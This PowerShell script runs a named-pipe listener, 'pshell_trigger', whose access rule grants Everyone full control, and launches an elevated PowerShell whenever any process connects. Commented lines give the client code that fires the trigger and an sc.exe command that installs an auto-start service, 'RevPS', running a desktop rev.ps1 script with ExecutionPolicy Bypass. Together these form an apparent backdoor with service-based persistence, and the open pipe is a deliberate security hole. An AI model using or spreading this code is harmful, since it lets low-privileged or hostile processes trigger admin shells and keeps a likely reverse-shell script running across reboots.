Add-Type -AssemblyName System.Core

$pipeName = "pshell_trigger"
$pipeSecurity = New-Object System.IO.Pipes.PipeSecurity

# Allow Everyone full control (for testing/demo only!)
$rule = New-Object System.IO.Pipes.PipeAccessRule("Everyone", "FullControl", "Allow")
$pipeSecurity.AddAccessRule($rule)

Write-Host "Listening on named pipe: \\.\pipe\$pipeName"

while ($true) {
    $pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream(
        $pipeName,
        [System.IO.Pipes.PipeDirection]::In,
        1,
        [System.IO.Pipes.PipeTransmissionMode]::Byte,
        [System.IO.Pipes.PipeOptions]::None,
        1024,
        1024,
        $pipeSecurity
    )

    $pipeServer.WaitForConnection()
    Write-Host "[+] Trigger received! Launching admin PowerShell..."
    Start-Process powershell -Verb runAs
    $pipeServer.Dispose()
}


## $pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", "pshell_trigger", [System.IO.Pipes.PipeDirection]::Out)
## $pipe.Connect()
## $pipe.Dispose()
## Get-ChildItem -Path \\.\pipe\
## sc.exe create "RevPS" binPath= "powershell.exe -NoLogo -ExecutionPolicy Bypass -File \"C:\Users\Ramvilas\Desktop\rev.ps1"" DisplayName= "RevPS" start= auto